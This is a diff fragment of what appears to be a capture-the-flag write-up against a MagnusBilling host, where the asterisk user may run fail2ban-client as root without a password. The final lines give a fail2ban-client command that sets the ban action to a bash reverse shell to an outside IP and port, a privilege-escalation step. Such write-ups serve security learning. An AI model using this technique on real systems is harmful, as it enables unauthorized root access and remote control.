@@ -26,8 +26,6 @@ PORT      STATE    SERVICE        REASON         VERSION
 ### Enumerate webapp
 
 ```
-/
-
 /mbilling/
 ```
 
@@ -72,8 +70,8 @@ Runas and Command-specific defaults for asterisk:
 User asterisk may run the following commands on ip-10-10-40-150:
     (ALL) NOPASSWD: /usr/bin/fail2ban-client
 ```
-We can run `fail2ban-client`, which is program used to block IP address when doing wrong login attempts.
 
+We can run `fail2ban-client`, which is program used to block IP address when doing wrong login attempts.
 ```sh
 # Trigger reverse shell when blocking someone.
 sudo fail2ban-client set sshd action iptables-multiport actionban "/bin/bash -c 'bash -i >& /dev/tcp/10.4.104.91/4441 0>&1'"
